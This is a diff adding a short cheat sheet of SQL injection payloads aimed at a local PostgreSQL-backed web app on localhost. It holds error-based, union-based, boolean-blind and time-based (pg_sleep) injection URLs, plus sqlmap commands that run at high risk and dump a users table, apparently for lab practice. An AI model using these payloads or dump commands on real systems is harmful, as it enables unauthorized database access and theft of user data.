@@ -1,0 +1,26 @@
+Error-based SQLi
+http://127.0.0.1:5000/user_info?id=1.
+
+http://127.0.0.1:5000/user_info?id=1'
+
+Union-based SQLi
+http://127.0.0.1:5000/search?query=test.
+
+http://127.0.0.1:5000/search?query=test' UNION SELECT 1, version() --
+
+Boolean-based Blind SQLi
+http://127.0.0.1:5000/exists?username=admin' AND '1'='1
+http://127.0.0.1:5000/exists?username=admin' AND '1'='2
+
+Time-based Blind SQLi
+http://127.0.0.1:5000/is_admin?username=admin.
+
+http://127.0.0.1:5000/is_admin?username=admin'; SELECT pg_sleep(5)--
+
+
+SQL MAP
+python sqlmap.py -u "http://127.0.0.1:5000/search" --data="username=test&password=test" --dbms=PostgreSQL --dump -T users -C username
+python sqlmap.py -u "http://127.0.0.1:5000/user_info?id=1" --dbms=PostgreSQL --batch --risk=3 --level=5
+sqlmap -u "http://127.0.0.1:5000/search?query=test" --dbms=PostgreSQL --batch --risk=3 --level=5
+sqlmap -u "http://127.0.0.1:5000/is_admin?username=admin" --dbms=PostgreSQL --batch --risk=3 --level=5
+sqlmap -u "http://127.0.0.1:5000/exists?username=admin" --dbms=PostgreSQL --batch --risk=3 --level=5
